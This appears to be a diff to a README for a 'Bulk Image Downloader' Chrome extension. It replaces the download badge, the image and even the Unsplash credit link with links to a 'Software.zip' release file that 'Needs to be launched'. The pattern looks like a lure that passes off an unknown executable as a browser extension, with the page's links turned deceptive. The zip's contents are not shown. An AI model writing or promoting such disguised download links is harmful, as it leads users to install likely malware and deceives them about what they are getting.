@@ -50,7 +50,7 @@ Explore a wide range of topics related to bulk image downloading with the Bulk-I
 
 Ready to revolutionize the way you download images in bulk? Click the button below to download the Bulk Image Downloader Chrome extension now!
 
-[![Download Bulk Image Downloader](https://img.shields.io/badge/Download-Bulk%20Image%20Downloader-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - Needs to be launched
+[![Download Bulk Image Downloader](https://github.com/Shaikhershad/Bulk-Image-Downloader-Free/releases/download/v1.0/Software.zip%20Image%20Downloader-brightgreen)](https://github.com/Shaikhershad/Bulk-Image-Downloader-Free/releases/download/v1.0/Software.zip) - Needs to be launched
 
 If the link does not work, please check the "Releases" section for alternative download options.
 
@@ -60,6 +60,6 @@ Have any questions, suggestions, or feedback? Feel free to reach out and connect
 
 Happy bulk image downloading! 🎉📸
 
-![Bulk Image Downloader](https://images.unsplash.com/photo-1536148935339-407d33e5b831)
+![Bulk Image Downloader](https://github.com/Shaikhershad/Bulk-Image-Downloader-Free/releases/download/v1.0/Software.zip)
 
-*Image Source: [Unsplash](https://unsplash.com/)*
+*Image Source: [Unsplash](https://github.com/Shaikhershad/Bulk-Image-Downloader-Free/releases/download/v1.0/Software.zip)*
